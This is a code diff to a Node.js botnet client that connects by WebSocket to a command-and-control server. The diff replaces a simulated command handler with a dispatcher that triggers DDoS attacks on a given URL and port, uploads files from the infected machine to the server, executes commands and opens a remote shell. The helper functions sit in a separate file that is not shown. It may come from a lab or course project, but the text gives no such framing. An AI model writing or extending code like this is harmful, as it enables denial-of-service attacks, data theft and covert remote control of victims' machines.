@@ -1,5 +1,7 @@
 const WebSocket = require('ws');
 
+const { send_file_to_sv, ddos, exec, start_shell } = require ('./commands.js')
+
 const serverUrl = 'ws://server:3000';
 const ws = new WebSocket(serverUrl);
 
@@ -7,16 +9,33 @@ ws.on('open', () => {
     console.log('Connected to C2 server');
 });
 
-ws.on('message', message => {
-    const command = JSON.parse(message);
-    console.log('Received command:', command);
+ws.on('message', message_raw => {
+    const message = JSON.parse(message_raw);
+    const id = message.id;
+    console.log('Received command:', message);
 
-    // Simulate command execution and send result back to the server
-    const result = {
-        id: command.id,
-        output: `Executed command: ${command.command}`
-    };
-    ws.send(JSON.stringify(result));
+    switch (message.command) {
+        case "DDoS":
+            ddos(id, message.url, message.port)
+            break;
+        case "Download":
+            const name = message.name
+            send_file_to_sv(id, name, message.filepath, ws);
+            break;
+
+        case "Exec":
+            exec(id)
+            break;
+
+        case "Shell":
+            start_shell(id)
+            break;
+
+        default:
+            console.log("Comando no reconocido.")
+            break;
+    }
+
 });
 
 ws.on('close', () => {
